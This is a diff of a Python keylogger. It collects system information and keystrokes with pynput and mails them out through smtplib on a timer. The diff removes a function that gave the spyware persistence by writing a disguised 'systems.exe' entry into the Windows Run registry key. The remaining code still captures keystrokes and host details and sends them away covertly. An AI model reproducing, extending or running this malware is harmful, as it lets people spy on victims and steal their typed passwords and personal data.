@@ -6,11 +6,10 @@ import smtplib
 import socket
 import platform
 from datetime import datetime
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 from requests import get
 import time
 import os
-import winreg
 import psutil
 import uuid
 import re
@@ -149,17 +148,6 @@ def current_time():
     return dt_string
 
 
-def add_to_registry():
-    s_name = "systems.exe"
-    address = os.path.abspath(os.getcwd()) + '\\' + s_name
-
-    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    open = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                          key_value, 0, winreg.KEY_ALL_ACCESS)
-    winreg.SetValueEx(open, "SYSTEMS", 0, winreg.REG_SZ, address)
-    winreg.CloseKey(open)
-
-
 def schedule():
     timer = Timer(interval=60, function=schedule)
     timer.daemon = True
@@ -169,17 +157,15 @@ def schedule():
 
 
 def main():
+
     try:
-        add_to_registry()
-        try:
-            computer_information()
-        except:
-            pass
-        send_email(system_information, file_path +
-                   extend + system_information, toaddr)
-        delete_system_inforamtion()
+        computer_information()
     except:
         pass
+    send_email(system_information, file_path +
+               extend + system_information, toaddr)
+    delete_system_inforamtion()
+
     with open(file_path + extend + keys_information, "w") as f:
         f.write(f"Start {current_time()}")
     schedule()
